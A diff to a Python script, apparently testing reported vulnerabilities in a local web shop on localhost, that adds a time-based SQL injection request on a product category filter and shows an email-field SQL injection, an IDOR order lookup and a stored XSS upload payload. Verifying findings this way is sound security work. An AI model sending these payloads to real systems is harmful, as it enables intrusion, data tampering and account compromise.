@@ -36,11 +36,18 @@ def run_tests():
     r_idor = s.get('http://localhost:3000/api/member/orders/10')
     print("IDOR Order #10:", r_idor.json())
 
-    print("\n=== 5. Test Time-based SQLi (Report #29 & #57) ===")
+    print("\n=== 5. Test Time-based SQLi (Report #4, #29, #57) ===")
+    # Test 5.1: SQLi on category filter (GET /api/store/products?category=...)
+    t0 = time.time()
+    r_sqli_cat = s.get("http://localhost:3000/api/store/products?category=ca-phe-y'+AND+(SELECT+1+FROM+(SELECT+SLEEP(2))x)--+")
+    dt_cat = time.time() - t0
+    print(f"SQLi on category filter response in {round(dt_cat, 2)}s (Expected ~2s delay)")
+
+    # Test 5.2: SQLi on profile email update (PATCH /api/member/me)
     t0 = time.time()
     r_sqli = s.patch('http://localhost:3000/api/member/me', json={'email': "huy@gmail.com' WHERE 1=1 AND (SELECT 1 FROM (SELECT SLEEP(2))x)-- "})
     dt = time.time() - t0
-    print(f"SQLi response in {round(dt, 2)}s (Expected ~2s delay)")
+    print(f"SQLi on profile email response in {round(dt, 2)}s (Expected ~2s delay)")
 
     print("\n=== 6. Test Insecure File Upload / Stored XSS (Report #44, #82) ===")
     payload = '<script>alert(document.domain)</script><h1>Hacked via SVG/HTML Upload</h1>'
